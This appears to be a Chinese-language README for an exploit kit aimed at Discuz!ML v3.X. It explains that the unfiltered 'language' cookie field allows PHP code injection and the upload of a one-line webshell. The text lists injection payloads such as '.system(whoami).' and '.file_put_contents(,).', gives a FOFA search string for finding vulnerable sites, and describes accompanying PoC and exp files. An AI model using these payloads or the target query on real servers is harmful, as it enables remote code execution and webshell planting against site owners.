漏洞发生的版本为 Discuz 国际版。Discuz!ML v3.X

用户数量不多，所以影响不大 product of codersclub.org

cookie 中 language 字段未添加 过滤所致，可以上传一句话木马

payload

'.phpinfo().'

'.system(dir).'

'.whoami.'

'.system(whoami).'

'.file_put_contents(,).'

fofa 查询特征: ```2009-2019 codersclub.org```


poc.py 为网上公布的监测poc,误报率较高

exp.txt 为 我写的exp

test.php 为我写的exp经一次url解码

test_copy.php 为检测 copy函数的php代码，验证通过



